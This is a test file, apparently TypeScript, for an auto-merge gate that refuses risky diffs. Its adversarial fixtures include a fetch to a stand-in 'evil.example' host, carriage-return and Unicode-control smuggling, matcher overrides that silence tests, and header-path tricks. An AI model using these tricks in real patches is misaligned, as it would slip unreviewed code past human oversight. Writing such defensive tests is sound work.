/**
 * Gate 1 of auto-merge (#9): what a diff may be and still be merged without a person. Each allowed class is shown
 * passing once, and then every way to get past it that we could think of is shown failing: unsure is never allowed.
 */
import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { assessBlastRadius, assessMergeFloor, excludedLineCategories, excludedPathCategories, isTestPath, judgedTheVerifiedFiles, parsePatch, testOnlyPatch, type BlastRadiusConfig } from "./blastRadius.js";

/**
 * The base revision of every file a patch changes, as the patch's own old side: each hunk's context and removed lines
 * at its line numbers, gaps blank. The helpers below start every hunk at line 1 and end it with the file, so this is the
 * whole file.
 */
function basesOf(patch: string): Map<string, string> {
  const out = new Map<string, string>();
  for (const f of parsePatch(patch) ?? []) {
    if (f.oldPath === null) continue;
    const lines: string[] = [];
    for (const h of f.hunks) {
      let at = h.oldStart - 1;
      for (const l of h.lines) if (l.kind !== "+") lines[at++] = l.text;
    }
    out.set(f.oldPath, Array.from(lines, (l) => l ?? "").join("\n") + "\n");
  }
  return out;
}
const gate = (patch: string, over: Partial<BlastRadiusConfig> = {}) => assessBlastRadius(patch, { excludedPaths: [], baseFiles: basesOf(patch), ...over });

/** A handler around every hunk the helpers build: the change is inside one function, with the file's start and end. */
const PRE = [" export async function handler(id, data) {", "   const started = Date.now();", '   log("start", id);'];
const POST = ['   log("done", started);', " }"];
/** One hunk on one file, wrapped in PRE/POST: `body` is the hunk's lines with their ` `, `-`, `+` prefixes. */
function diff(path: string, body: string[], wrap = true): string {
  const all = wrap ? [...PRE, ...body, ...POST] : body;
  const old = all.filter((l) => !l.startsWith("+")).length;
  const neu = all.filter((l) => !l.startsWith("-")).length;
  return [`diff --git a/${path} b/${path}`, `--- a/${path}`, `+++ b/${path}`, `@@ -1,${old} +1,${neu} @@`, ...all].join("\n") + "\n";
}
const SRC = "functions/src/orders/createOrder.ts";
const TEST = "functions/src/orders/createOrder.test.ts";
const addedTest = [
  `diff --git a/${TEST} b/${TEST}`,
  "new file mode 100644",
  "--- /dev/null",
  `+++ b/${TEST}`,
  "@@ -0,0 +1,3 @@",
  '+it("works without a coupon", async () => {',
  "+  expect(await createOrder({})).toBeDefined();",
  "+});",
].join("\n") + "\n";

const guard = diff(SRC, ["  const order = await load(id);", "+  if (order == null) return null;", "   return order.total;"]);
const guardBlock = diff(SRC, ["  const order = await load(id);", "+  if (order === null || order === undefined || order.items === undefined) {", "+    return undefined;", "+  }", "   return order.items;"]);
const chaining = diff(SRC, ["  const order = await load(id);", "-  const n = order.items.length;", "+  const n = order?.items?.length ?? null;", "   return n;"]);
const missingAwait = diff(SRC, ["  const ref = db.collection(\"orders\").doc(id);", "-  ref.set(data);", "+  await ref.set(data);", "   return ref.id;"]);
const undefinedField = diff(SRC, ["  await ref.set({", "    total: data.total,", "-    couponCode: data.couponCode,", "+    ...(data.couponCode !== undefined && { couponCode: data.couponCode }),", "  });"]);
const coalesceNull = diff(SRC, ["  await ref.set({", "-    note: data.note,", "+    note: data.note ?? null,", "  });"]);

describe("parsePatch", () => {
  it("reads files, hunks and line kinds, with or without a diff --git header", () => {
    const files = parsePatch(guard + addedTest)!;
    expect(files.map((f) => [f.oldPath, f.newPath])).toEqual([[SRC, SRC], [null, TEST]]);
    expect(files[0]!.hunks[0]!.lines.map((l) => l.kind)).toEqual([" ", " ", " ", " ", "+", " ", " ", " "]);
    expect(parsePatch("--- a/x.ts\n+++ b/x.ts\n@@ -1 +1 @@\n-a\n+b\n")).toHaveLength(1);
  });
  it("is null (unsure) for anything it does not understand", () => {
    expect(parsePatch("")).toBeNull();
    expect(parsePatch("not a diff\n")).toBeNull();
    expect(parsePatch("--- a/x.ts\n+++ b/x.ts\n@@ -1,2 +1,2 @@\n-a\n+b\n")).toBeNull(); // counts do not add up
    expect(parsePatch('--- "a/we ird.ts"\n+++ "b/we ird.ts"\n@@ -1 +1 @@\n-a\n+b\n')).toBeNull();
    expect(parsePatch("--- a/x.ts\n@@ -1 +1 @@\n-a\n+b\n")).toBeNull(); // no +++ header
    expect(parsePatch("--- a/x.ts\n+++ b/x.ts\n@@ -1 +1 @@\n-a\n+b\ngarbage\n")).toBeNull();
  });
});

describe("assessBlastRadius: a default or a field write that changes what the code does is not a fix class", () => {
  it.each([
    ["`?? <literal>` that swallows the rest of an expression", ["  const item = get(id);", "-  const level = item.count + extra;", "+  const level = item.count ?? 0 + extra;", "   return level;"]],
    ["`?? <literal>` that swallows a comparison", ["  const n = count(id);", "-  if (n > limit) return n;", "+  if (n ?? 0 > limit) return n;", "   return 0;"]],
    ["a non-null default inside a condition", ["  const item = get(id);", "-  if (item.hidden) return level;", "+  if (item.hidden ?? true) return level;", "   return 0;"]],
    ["a non-null default behind a negation", ["  const item = get(id);", "-  const shown = !item.hidden;", "+  const shown = !(item.hidden ?? false);", "   return shown;"]],
    ["a field written only when a call returns something (the call runs twice)", ["  await ref.set({", "    total: data.total,", "-    number: nextNumber(),", "+    ...(nextNumber() !== undefined && { number: nextNumber() }),", "  });"]],
    ["a field skipped when null (an explicit null meant to clear it)", ["  await ref.set({", "    total: data.total,", "-    note: data.note,", "+    ...(data.note != null && { note: data.note }),", "  });"]],
  ])("refuses %s", (_name, body) => {
    expect(gate(diff(SRC, body as string[]))).toMatchObject({ allowed: false });
  });

  it("still allows a null default that ends its expression, also in a condition", () => {
    expect(gate(diff(SRC, ["  const o = get(id);", "-  const n = f(o.items.length, 1);", "+  const n = f(o.items?.length ?? null, 1);", "   return n;"])).allowed).toBe(true);
    expect(gate(diff(SRC, ["  const o = get(id);", "-  if (o.items.length) return o;", "+  if (o.items?.length ?? null) return o;", "   return null;"])).allowed).toBe(true);
    expect(gate(diff(SRC, ["  const o = get(id);", "-  return o.items.length;", "+  return o.items?.length ?? undefined;", " }"])).allowed).toBe(true);
  });

  // The review's proofs (#239): outside an `if`, a ternary or a boolean operator, a non-null default still decides.
  it.each([
    ["an assignment a later `if` decides on", ["  log(\"c\");", "-  const hide = item.hidden;", "+  const hide = item.hidden ?? true;", "   log(\"d\");", "   if (hide) return \"\";"]],
    ["a return", ["  log(\"f\");", "-  return item.visible;", "+  return item.visible ?? true;", " }"]],
    ["a comparison", ["  log(\"c\");", "-  const flagged = (item.reports) > 2;", "+  const flagged = (item.reports ?? 99) > 2;", "   log(\"d\");"]],
    ["a zero for a count", ["  const o = get(id);", "-  const n = f(o.items.length, 1);", "+  const n = f(o.items?.length ?? 0, 1);", "   return n;"]],
    ["an empty string", ["  const o = get(id);", "-  const name = o.name;", "+  const name = o.name ?? \"\";", "   return name;"]],
    ["a null default compared: `null >= 0` is true, `undefined >= 0` false", ["  const o = get(id);", "-  const ok = (o.n) >= 0;", "+  const ok = (o.n ?? null) >= 0;", "   return ok;"]],
    ["a null default in arithmetic: null is 0, undefined NaN", ["  const o = get(id);", "-  const t = (o.n) + 1;", "+  const t = (o.n ?? null) + 1;", "   return t;"]],
    ["a null default strictly compared", ["  const o = get(id);", "-  const none = (o.n) === undefined;", "+  const none = (o.n ?? null) === undefined;", "   return none;"]],
  ])("refuses a non-null or deciding default in %s (#239)", (_name, body) => {
    const r = gate(diff(SRC, body as string[]));
    expect(r.allowed).toBe(false);
    expect(r.problems).toContain("not-an-allowed-class");
  });
});

describe("assessBlastRadius: a `\\ No newline at end of file` marker only at the end of the file (#237)", () => {
  const MARK = "\\ No newline at end of file";
  /** The review's proof: git joins the guard onto the next line, and `await assertCanRead(…)` is never run. */
  const documents = [
    "export async function getDocument(req: { user: string; id: string }) {",
    "  const doc = await load(req.id);",
    '  log("loaded");',
    '  log("checking");',
    "  await assertCanRead(req.user, doc);",
    '  log("ok");',
    '  log("returning");',
    "  return doc;",
    "}",
  ].join("\n") + "\n";
  const midHunk = [
    "diff --git a/src/documents.ts b/src/documents.ts",
    "--- a/src/documents.ts",
    "+++ b/src/documents.ts",
    "@@ -2,7 +2,8 @@",
    "   const doc = await load(req.id);",
    '   log("loaded");',
    '   log("checking");',
    "+  if (doc.meta == null) return",
    MARK,
    "   await assertCanRead(req.user, doc);",
    '   log("ok");',
    '   log("returning");',
    "   return doc;",
  ].join("\n") + "\n";
  const atBase = (patch: string, base: string) => gate(patch, { baseFiles: new Map([["src/documents.ts", base]]) });

  it("refuses a marker inside a hunk: git writes one line where the gate read two", () => {
    const r = atBase(midHunk, documents);
    expect(r.allowed).toBe(false);
    expect(r.problems).toContain("no-newline-marker");
    // With a `;` the guard is a whole statement here, and still the marker joins it onto the access check.
    expect(atBase(midHunk.replace("return\n", "return;\n"), documents).problems).toContain("no-newline-marker");
  });

  it("refuses the same with a new test file beside it (the review's p1)", () => {
    const orders = ["export async function fulfil(order: { note?: string | null; id: string }) {", "  const id = order.id;", "  log(id);", '  log("start");', '  log("next");', "  await notifyWarehouse(order);", '  log("done");', '  log("end");', "  return id;", "}"].join("\n") + "\n";
    const p1 = [
      "diff --git a/src/orders.ts b/src/orders.ts",
      "--- a/src/orders.ts",
      "+++ b/src/orders.ts",
      "@@ -2,7 +2,8 @@",
      "   const id = order.id;",
      "   log(id);",
      '   log("start");',
      '   log("next");',
      "+  if (order.note == null) return;",
      MARK,
      "   await notifyWarehouse(order);",
      '   log("done");',
      '   log("end");',
      "diff --git a/src/orders.null.test.ts b/src/orders.null.test.ts",
      "new file mode 100644",
      "--- /dev/null",
      "+++ b/src/orders.null.test.ts",
      "@@ -0,0 +1,3 @@",
      '+import { it } from "vitest";',
      '+import { fulfil } from "./orders.js";',
      '+it("handles a null note", async () => { await fulfil({ id: "1", note: null }); });',
    ].join("\n") + "\n";
    const r = gate(p1, { baseFiles: new Map([["src/orders.ts", orders]]) });
    expect(r.allowed).toBe(false);
    expect(r.problems).toContain("no-newline-marker");
  });

  it("refuses a marker after a hunk's last line when the hunk does not reach the file's end", () => {
    const short = ["--- a/src/documents.ts", "+++ b/src/documents.ts", "@@ -2,4 +2,5 @@", "   const doc = await load(req.id);", '   log("loaded");', '   log("checking");', "+  if (doc.meta == null) return;", "   await assertCanRead(req.user, doc);", MARK].join("\n") + "\n";
    expect(atBase(short, documents).problems).toContain("no-newline-marker");
  });

  it("refuses a marker on the old side when the base file does end with a line end, and a hunk after a marked one", () => {
    const end = ["--- a/src/documents.ts", "+++ b/src/documents.ts", "@@ -5,5 +5,6 @@", "   await assertCanRead(req.user, doc);", '   log("ok");', '   log("returning");', "+  if (doc == null) return;", "   return doc;", " }", MARK].join("\n") + "\n";
    // The base really has no line end: the marker is fine (the access check in the function refuses it anyway).
    expect(atBase(end, documents.slice(0, -1)).problems).not.toContain("no-newline-marker");
    expect(atBase(end, documents).problems).toContain("no-newline-marker");
    const twoHunks = ["--- a/x.ts", "+++ b/x.ts", "@@ -1 +1 @@", "-a", "+b", MARK, "@@ -5 +5 @@", "-c", "+d"].join("\n") + "\n";
    expect(parsePatch(twoHunks)![0]!.unusual).toContain("no-newline-marker");
  });

  it("is not understood where it follows no hunk line, or twice in a row", () => {
    expect(parsePatch(["--- a/x.ts", MARK, "+++ b/x.ts", "@@ -1 +1 @@", "-a", "+b"].join("\n") + "\n")).toBeNull();
    expect(parsePatch(["--- a/x.ts", "+++ b/x.ts", "@@ -1 +1 @@", "-a", "+b", MARK, MARK].join("\n") + "\n")).toBeNull();
  });

  it("still allows a marker at the true end: a file's last line changed, and a new test file without a final line end", () => {
    // git's own shape for a last line that had no line end and gains one: the old side's marker sits mid-hunk.
    const parsed = parsePatch(["--- a/x.ts", "+++ b/x.ts", "@@ -1 +1,2 @@", "-a", MARK, "+a", "+b"].join("\n") + "\n")!;
    expect(parsed[0]!.unusual).toEqual([]);
    expect(parsed[0]!.hunks[0]!.noNewlineAtEnd).toEqual({ old: true, new: false });
    expect(gate(guard + addedTest + MARK + "\n")).toMatchObject({ allowed: true, testFiles: [TEST] });
    const bothEnds = guard.trimEnd() + "\n" + MARK + "\n";
    expect(gate(bothEnds, { baseFiles: new Map([[SRC, basesOf(guard).get(SRC)!.slice(0, -1)]]) })).toMatchObject({ allowed: true, problems: [] });
  });
});

describe("assessBlastRadius: a guard is a whole statement, never joined onto the next line (#238)", () => {
  it.each([
    ["a destructuring assignment (the review's proof)", "  [stock] = await Promise.all([reserveStock(items)]);"],
    ["a call in parentheses", "  (async () => {})();"],
    ["a template literal", "  `${x}`;"],
    ["a unary plus", "  +count;"],
    ["a unary minus", "  -count;"],
    ["a regular expression", "  /x/.test(s);"],
  ])("refuses a guard without `;` before %s", (_name, next) => {
    const r = gate(diff(SRC, ["  const o = get(id);", "+  if (o == null) return null", ` ${next}`]));
    expect(r.allowed).toBe(false);
    expect(r.problems).toContain("not-an-allowed-class");
  });

  it("refuses a guard without `;` before any line, and one with `;` before a line that could continue a statement", () => {
    expect(gate(diff(SRC, ["  const o = get(id);", "+  if (o == null) return", "   return o.total;"])).allowed).toBe(false);
    expect(gate(diff(SRC, ["  const o = get(id);", "+  if (o == null) return null;", "   [a] = o.items;"])).allowed).toBe(false);
  });

  it("still allows a guard ended by `;` or a block, before a line or a comment", () => {
    expect(gate(diff(SRC, ["  const o = get(id);", "+  if (o == null) { return null }", "   return o.total;"])).allowed).toBe(true);
    expect(gate(diff(SRC, ["  const o = get(id);", "+  if (o == null) return null;", "   // the total", "   return o.total;"])).allowed).toBe(true);
  });
});

describe("assessBlastRadius: the allowed classes", () => {
  it.each([
    ["an early return when a value is missing", guard, "null-guard"],
    ["a multi-line guard with ||", guardBlock, "null-guard"],
    ["optional chaining and ?? a literal", chaining, "null-guard"],
    ["a missing await", missingAwait, "missing-await"],
    ["a field written only when defined", undefinedField, "firestore-undefined-field"],
    ["a field written as ?? null", coalesceNull, "firestore-undefined-field"],
  ])("allows %s", (_name, patch, fixClass) => {
    const r = gate(patch);
    expect(r).toMatchObject({ allowed: true, fixClass, sourceFile: SRC, problems: [] });
  });

  it("allows an added test file beside the one source change, and names it", () => {
    expect(gate(guard + addedTest)).toMatchObject({ allowed: true, fixClass: "null-guard", testFiles: [TEST] });
  });

  it("allows shorthand fields, a bare return and throw guards, and `return await`", () => {
    expect(gate(diff(SRC, ["  batch.set(ref, {", "-    coupon,", "+    ...(coupon !== undefined && { coupon }),", "  });"])).allowed).toBe(true);
    expect(gate(diff(SRC, ["  const o = get(id);", "+  if (o.items == null) return;", "   total += o.items.length;"])).allowed).toBe(true);
    expect(gate(diff(SRC, ["  const o = get(id);", '+  if (typeof o === "undefined") throw new NotFoundError("no order");', "   return o;"])).allowed).toBe(true);
    expect(gate(diff(SRC, ["  const ref = doc(id);", "-  return ref.get();", "+  return await ref.get();", " }"])).allowed).toBe(true);
  });
});

describe("assessBlastRadius: never on unsure (adversarial diffs)", () => {
  const refused = (patch: string, problem: string) => {
    const r = gate(patch);
    expect(r.allowed).toBe(false);
    expect(r.problems).toContain(problem);
  };

  it("refuses a guard that does more than exit", () => {
    refused(diff(SRC, ["  const o = get(id);", "+  if (!o) return sendEmail(o);", "   return o;"]), "not-an-allowed-class");
    refused(diff(SRC, ["  const o = get(id);", "+  if (!o) { o = {}; }", "   return o;"]), "not-an-allowed-class");
    refused(diff(SRC, ["  const o = get(id);", "+  if (o.isDeleted) return null;", "   return o;"]), "not-an-allowed-class"); // not a missing check
    refused(diff(SRC, ["  const o = get(id);", "+  if (!load(id)) return null;", "   return o;"]), "not-an-allowed-class"); // a call in the condition
    refused(diff(SRC, ["  const o = get(id);", "+  if (o != null) return null;", "   return o;"]), "not-an-allowed-class");
    refused(diff(SRC, ["  const o = get(id);", "+  if (!o) return null; deleteAll();", "   return o;"]), "not-an-allowed-class");
  });

  it("refuses a guard that returns a decision instead of leaving: `!x` is any falsy value, not only a missing one (#202)", () => {
    for (const exit of ["return true;", "return false;", "return 0;", 'return "ok";', "return [];", "return {};", "continue;", "break;"]) {
      refused(diff(SRC, ["  const o = get(id);", `+  if (!o.flagged) ${exit}`, "   return check(o);"]), "not-an-allowed-class");
    }
  });

  it("refuses an access-control path, whatever its word for it (#202)", () => {
    for (const path of ["src/guards/isOwner.ts", "src/policies/canRead.ts", "src/firebase/appCheck.ts", "functions/src/verifyRequest.ts", "src/app-check/x.ts", "src/canShip.ts"]) {
      const r = gate(diff(path, ["  const doc = get(id);", "+  if (doc == null) return null;", "   return doc.total;"]));
      expect(r.problems, path).toContain("excluded:access-control");
    }
    expect(excludedPathCategories("src/scanner/cancel.ts")).toEqual([]); // "can" is a word, not a prefix
  });

  it("refuses a guard whose context is an ownership check: the guard changes what that check decides (#202)", () => {
    refused(diff(SRC, ["  const doc = await get(id);", "+  if (doc == null) return null;", "   return doc.ownerId === user.uid;"]), "excluded:access-control");
    refused(diff(SRC, ["  if (!context.auth) throw new HttpsError(\"unauthenticated\");", "+  if (order == null) return null;", "   return order.total;"]), "excluded:access-control");
  });

  it("does not take a context line that only carries an access word for a check: the order's owner written with it", () => {
    const write = diff(SRC, ["  await ref.set({", "    uid,", "    items: input.items,", "-    couponCode: input.couponCode,", "+    ...(input.couponCode !== undefined && { couponCode: input.couponCode }),", "    status: \"pending\",", "  });"]);
    expect(gate(write)).toMatchObject({ allowed: true, fixClass: "firestore-undefined-field" });
  });

  it("refuses a line changed beyond the class", () => {
    refused(diff(SRC, ["  x();", "-  ref.set(data);", "+  await ref.set(other);", "  y();"]), "not-an-allowed-class");
    refused(diff(SRC, ["  x();", "-  const n = order.items.length;", "+  const n = order?.items?.length ?? compute();", "  y();"]), "not-an-allowed-class");
    refused(diff(SRC, ["  x();", "-  const n = order.items.length;", "+  const n = order?.items?.size;", "  y();"]), "not-an-allowed-class");
    refused(diff(SRC, ["  x();", "-    couponCode: data.couponCode,", "+    ...(data.other !== undefined && { couponCode: data.couponCode }),", "  y();"]), "not-an-allowed-class");
    refused(diff(SRC, ["  x();", "-    couponCode: data.couponCode,", "+    couponCode: data.couponCode || null,", "  y();"]), "not-an-allowed-class");
    refused(diff(SRC, ["  x();", '-  log("saved");', '+  log("await saved");', "  y();"]), "not-an-allowed-class");
    refused(diff(SRC, ["  x();", "-  const a = 1;", "  y();"]), "not-an-allowed-class"); // a pure removal
  });

  it("refuses two classes in one patch", () => {
    refused(diff(SRC, ["  const o = get(id);", "+  if (o == null) return null;", "   x();", "-  ref.set(o);", "+  await ref.set(o);", "  y();"]), "mixed-classes");
  });

  it("refuses more than one function: two hunks, a definition between the changes, a module-level line", () => {
    const two = guard + ["@@ -80,2 +81,3 @@", "  const p = get(id);", "+  if (!p) return null;", "   return p;"].join("\n") + "\n";
    expect(parsePatch(two)![0]!.hunks).toHaveLength(2);
    refused(two, "more-than-one-function");
    refused(diff(SRC, ["  const o = get(id);", "+  if (!o) return null;", " }", " ", " export async function other(id) {", "+  if (!id) return null;", "   return id;"]), "more-than-one-function");
    refused(diff(SRC, ["  const o = get(id);", "+  if (!o) return null;", "   const f = () => 1;", "+  if (!f) return null;", "   return o;"]), "more-than-one-function");
    refused(diff(SRC, [" const o = get(id);", "+if (!o) return null;", " export default o;"]), "more-than-one-function");
  });

  it("refuses more than one production file, and a new one", () => {
    refused(guard + diff("functions/src/orders/listOrders.ts", ["  const o = get(id);", "+  if (!o) return null;", "   return o;"]), "more-than-one-file");
    const created = ["diff --git a/functions/src/orders/x.ts b/functions/src/orders/x.ts", "new file mode 100644", "--- /dev/null", "+++ b/functions/src/orders/x.ts", "@@ -0,0 +1 @@", "+if (!o) return null;"].join("\n") + "\n";
    refused(created, "new-source-file");
    refused(addedTest, "no-source-change");
  });

  it("refuses any change to a test file that already exists: tests may only be added as new files (#204)", () => {
    // Losing a line: deleting the test that judges a patch.
    refused(guard + diff(TEST, [' it("x", () => {', "-  expect(f()).toBe(1);", " });"], false), "existing-test-file-changed");
    // Gaining lines can switch existing tests off just as well. A deny-list of what added lines may not say cannot be
    // completed: a whole new describe can still re-define a matcher the existing tests use (the review's proof).
    const extend = [
      " import { describe, it, expect } from \"vitest\";",
      ' import { createOrder } from "./createOrder";',
      " ",
      '+describe("no coupon", () => { expect.extend({ toThrow: () => ({ pass: true, message: () => "" }) }); it("works", () => { expect(createOrder({})).toBeDefined(); }); });',
      ' describe("createOrder", () => {',
      '   it("rejects zero", () => {',
      "     expect(() => createOrder({ qty: 0 })).toThrow();",
    ];
    refused(guard + diff(TEST, extend, false), "existing-test-file-changed");
    for (const added of [
      ['+it("works without a coupon", async () => {', "+  expect(await createOrder({})).toEqual({ total: 0, items: [] });", "+});"],
      ['+vi.spyOn(console, "error").mockImplementation(() => {});'],
      ['+Object.defineProperty(globalThis, "fetch", { value: () => null });'],
      ['+it.skip("x", () => {});'],
      ["+    return;"],
    ]) {
      refused(guard + diff(TEST, [" });", ...added, ' it("y", () => {});'], false), "existing-test-file-changed");
    }
  });

  it("still allows a new test file, and only one made of added lines", () => {
    expect(gate(guard + addedTest)).toMatchObject({ allowed: true, testFiles: [TEST] });
    expect(gate(addedTest + guard)).toMatchObject({ allowed: true, testFiles: [TEST] });
  });

  it("refuses a new test file that is not a test by name, or a mock or snapshot directory's file", () => {
    const created = (path: string) =>
      [`diff --git a/${path} b/${path}`, "new file mode 100644", "--- /dev/null", `+++ b/${path}`, "@@ -0,0 +1 @@", "+export const x = 1;"].join("\n") + "\n";
    for (const path of ["test/helpers.ts", "tests/setup.js", "src/__tests__/__mocks__/db.test.ts", "test/__snapshots__/a.test.ts.snap"]) {
      const r = gate(guard + created(path));
      expect(r.allowed, path).toBe(false);
      expect(r.problems, path).toContain("test-file-not-a-test");
    }
  });

  it("refuses a carriage return, a Unicode line or paragraph separator, or another control character anywhere (#204)", () => {
    // The review's proof: JS ends a line at a lone CR, so this "comment" runs `return;` and unregisters the tests after it.
    const crInExisting = [' describe("shipOrder", () => {', '+  it("none", () => { expect(f()).toBeUndefined(); });', "+  // covered elsewhere\r  return;", '   it("rejects zero", () => {'];
    refused(guard + diff(TEST, crInExisting, false), "control-characters");
    const inNewTest = addedTest.replace("+});", "+}); // done\r  process.exitCode = 0;");
    refused(guard + inNewTest, "control-characters");
    for (const ch of ["\u2028", "\u2029", "\u0000", "\u000b", "\u000c", "\u001b", "\u007f", "\u0085", "\u200b", "\u202e", "\u2066", "\ufeff"]) {
      refused(diff(SRC, ["  const order = await load(id);", `+  if (order == null) return null; //${ch}`, "   return order.total;"]), "control-characters");
      refused(diff(SRC, [`  const order = await load(id); //${ch}`, "+  if (order == null) return null;", "   return order.total;"]), "control-characters");
    }
    // A tab is ordinary, and a CRLF file's line endings are not a lone CR.
    expect(gate(diff(SRC, ["  const order = await load(id);", "+\tif (order == null) return null;", "   return order.total;"])).allowed).toBe(true);
    expect(gate(guard.replace(/\n/g, "\r\n")).allowed).toBe(true);
  });

  it("refuses a header path git would read differently, and a rename hidden in the headers (#200)", () => {
    const evil = "test/src/inventory.ts";
    const unprefixed = [`--- ${evil}`, `+++ ${evil}`, "@@ -1 +1,2 @@", " x();", '+fetch("https://evil.example/");'].join("\n") + "\n";
    // git apply (-p1) strips `test/`, and writes src/inventory.ts: a second production file, read here as a test.
    expect(parsePatch(guard + unprefixed)).toBeNull();
    refused(guard + unprefixed, "diff-not-understood");
    refused(guard + [`diff --git a/${evil} b/${evil}`, `--- b/${evil}`, `+++ a/${evil}`, "@@ -1 +1,2 @@", " x();", "+y();"].join("\n") + "\n", "diff-not-understood");
    // A rename with no `rename from` header: two names in the headers.
    const renamed = ["diff --git a/src/other.ts b/test/x.test.ts", "--- a/src/other.ts", "+++ b/test/x.test.ts", "@@ -1 +1,2 @@", " x();", "+y();"].join("\n") + "\n";
    refused(guard + renamed, "rename-or-copy");
    // diff --git names one file and the headers another.
    const mismatched = ["diff --git a/src/other.ts b/src/other.ts", "--- a/test/x.test.ts", "+++ b/test/x.test.ts", "@@ -1 +1,2 @@", " x();", "+y();"].join("\n") + "\n";
    expect(parsePatch(mismatched)).toBeNull();
    // A diff --git section with no file headers at all.
    refused(guard + "diff --git a/src/other.ts b/test/x.test.ts\n", "no-file-headers");
  });

  it("refuses deletes, renames, mode changes and binary files", () => {
    refused(["diff --git a/functions/src/a.ts b/functions/src/a.ts", "deleted file mode 100644", "--- a/functions/src/a.ts", "+++ /dev/null", "@@ -1 +0,0 @@", "-x"].join("\n") + "\n", "file-deleted");
    refused(["diff --git a/x.ts b/y.ts", "similarity index 100%", "rename from x.ts", "rename to y.ts"].join("\n") + "\n" + guard, "rename-or-copy");
    refused(["diff --git a/run.sh b/run.sh", "old mode 100644", "new mode 100755"].join("\n") + "\n" + guard, "mode-change");
    refused(["diff --git a/logo.png b/logo.png", "Binary files a/logo.png and b/logo.png differ"].join("\n") + "\n" + guard, "binary");
  });

  it("refuses a change too large or too spread out to be one small fix", () => {
    const big = ["  const o = get(id);", ...Array.from({ length: 9 }, (_, i) => `+  if (o${i} == null) return null;`), "   return o;"];
    refused(diff(SRC, big), "change-too-large");
  });

  it("refuses anything that is not JavaScript or TypeScript", () => {
    refused(diff("functions/main.py", ["  o = get(id)", "+  if (!o) return null;", "   return o"]), "not-javascript-or-typescript");
  });
});

describe("assessBlastRadius: the hard-exclude list", () => {
  const guardIn = (path: string) => diff(path, ["  const o = get(id);", "+  if (o == null) return null;", "   return o;"]);
  it.each([
    ["functions/src/auth/verify.ts", "access-control"],
    ["functions/src/authMiddleware.ts", "access-control"],
    ["functions/src/admin/users.ts", "access-control"],
    ["firestore.rules", "security-rules"],
    ["storage.rules", "security-rules"],
    ["functions/src/payments/charge.ts", "money"],
    ["functions/src/stripeWebhook.ts", "money"],
    ["functions/src/crypto/sign.ts", "secrets"],
    ["functions/src/secrets.ts", "secrets"],
    ["db/migrations/001_add.ts", "schema"],
    ["firestore.indexes.json", "schema"],
    ["package.json", "dependencies"],
    ["pnpm-lock.yaml", "dependencies"],
    ["node_modules/x/index.js", "dependencies"],
    [".github/workflows/ci.yml", "ci-config"],
    ["cloudbuild.yaml", "ci-config"],
    ["firebase.json", "dependencies"],
    ["functions/src/config.ts", "ci-config"],
    ["packages/core/index.ts", "shared-package"],
    ["functions/src/shared/db.ts", "shared-package"],
    ["functions/src/utils/format.ts", "shared-package"],
  ])("%s is %s", (path, category) => {
    expect(excludedPathCategories(path)).toContain(category);
    const r = gate(guardIn(path));
    expect(r.allowed).toBe(false);
    expect(r.problems).toContain(`excluded:${category}`);
  });

  it("excludes what the deployment lists, test files included", () => {
    expect(gate(guard, { excludedPaths: ["functions/src/orders/"] }).problems).toContain("excluded:configured");
    expect(gate(guard + addedTest, { excludedPaths: ["*.test.ts"] }).problems).toContain("excluded:configured");
  });

  it.each([
    ["an access check", "+  if (!context.auth) return null;"],
    ["a role", "+  if (!user.role) return null;"],
    ["money", "+  if (!order.amount) return null;"],
    ["a key", "+  if (!process.env.KEY) return null;"],
    ["a checkout session", "+  if (!checkoutSession.url) return null;"],
    ["an import", "+import { x } from \"y\";"],
    ["a require", "+  if (!require(\"x\")) return null;"],
  ])("refuses a changed line that touches %s, whatever the path", (_name, line) => {
    const r = gate(diff(SRC, ["  const o = get(id);", line, "   return o;"]));
    expect(r.allowed).toBe(false);
    expect(r.problems.some((p) => p.startsWith("excluded:"))).toBe(true);
  });

  it("does not exclude ordinary product code", () => {
    expect(excludedPathCategories(SRC)).toEqual([]);
    expect(excludedPathCategories(TEST)).toEqual([]);
  });
});

describe("assessBlastRadius: a null guard checks for null or undefined, never for any falsy value (#202)", () => {
  const at = (cond: string) => gate(diff(SRC, ["  const o = await load(id);", `+  if (${cond}) return null;`, "   return o.total;"]));
  it.each(["o == null", "o === null", "o === undefined", "o == undefined", 'typeof o === "undefined"', "typeof o == 'undefined'", "null == o", "undefined === o", "o == null || o.items == null", "o?.items === undefined"])(
    "allows `if (%s)`",
    (cond) => {
      expect(at(cond)).toMatchObject({ allowed: true, fixClass: "null-guard" });
    }
  );
  it.each(["!o", "!o.items", "!o?.items", "o == null || !o.items", "!o || o.items == null", "!!o", "o == 0", "o === false", 'o === ""', "o != null"])("refuses `if (%s)`: true for 0, \"\", false or NaN too", (cond) => {
    expect(at(cond)).toMatchObject({ allowed: false });
    expect(at(cond).problems).toContain("not-an-allowed-class");
  });
});

describe("assessBlastRadius: the whole function in the base file, not only the context the patch chose (#202)", () => {
  const FILE = "functions/src/docs/denialReason.ts";
  /** One function, and a line after it; `line2` is its second line, a decision far from the change. */
  const base = (line2: string) =>
    [
      "export function denialReason(doc: Doc, user: User): string | null {",
      line2,
      "  const a = 1;",
      "  const b = 2;",
      "  const c = 3;",
      "  const meta = doc.meta;",
      "  log(meta);",
      "  const d = 4;",
      "  const e = 5;",
      "  const f = 6;",
      "  return null;",
      "}",
      "",
      "export const other = 1;",
    ].join("\n") + "\n";
  /** The guard after `const meta`, with three lines of context on each side, in a file whose line 1 is `first`. */
  const hunkAt = (first: number) =>
    diff(FILE, ["   const b = 2;", "   const c = 3;", "   const meta = doc.meta;", "+  if (meta == null) return null;", "   log(meta);", "   const d = 4;", "   const e = 5;"], false)
      .replace("@@ -1,", `@@ -${first + 3},`)
      .replace(" +1,", ` +${first + 3},`);
  const patch = hunkAt(1);
  const withBase = (line2: string) => gate(hunkAt(1 + line2.split("\n").length - 1), { baseFiles: new Map([[FILE, base(line2)]]) });
  /** The same function after `before` (whole lines). */
  const after = (before: string[]) => gate(hunkAt(before.length + 1), { baseFiles: new Map([[FILE, [...before, base("  const z = 0;")].join("\n")]]) });

  it("allows the guard when nothing in the function decides access, money or a secret", () => {
    expect(withBase("  const z = 0;")).toMatchObject({ allowed: true, fixClass: "null-guard" });
  });

  it.each([
    ["an ownership check", "  if (doc.ownerId !== user.uid) return \"not yours\";", "excluded:access-control"],
    ["an auth check over two lines", "  if (\n    !context.auth\n  ) throw new Error(\"x\");", "excluded:access-control"],
    ["a return of an ownership test, split over lines", "  if (gone(doc)) return (\n    doc.owner\n  );", "excluded:access-control"],
